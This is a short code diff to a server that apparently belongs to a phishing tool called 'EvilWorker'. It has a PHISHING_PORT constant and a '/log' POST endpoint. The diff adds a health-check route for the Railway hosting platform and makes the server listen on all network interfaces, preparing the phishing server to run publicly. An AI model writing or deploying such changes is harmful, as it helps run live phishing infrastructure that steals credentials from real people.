@@ -107,6 +107,12 @@ self.addEventListener('fetch', event => {
         return;
     }
 
+// ===== HEALTH CHECK ENDPOINT (REQUIRED FOR RAILWAY) =====
+if (pathname === '/health') {
+    res.writeHead(200, { 'Content-Type': 'application/json' });
+    res.end(JSON.stringify({ status: 'ok', timestamp: Date.now() }));
+    return;
+}
     // ===== 3. HANDLE LOGGING ENDPOINT =====
     if (pathname === '/log' && req.method === 'POST') {
         let body = [];
@@ -152,6 +158,6 @@ self.addEventListener('fetch', event => {
     res.end('Not found');
 });
 
-server.listen(PHISHING_PORT, () => {
+server.listen(PHISHING_PORT, '0.0.0.0', () => {
     console.log(`EvilWorker running on port ${PHISHING_PORT}`);
 });
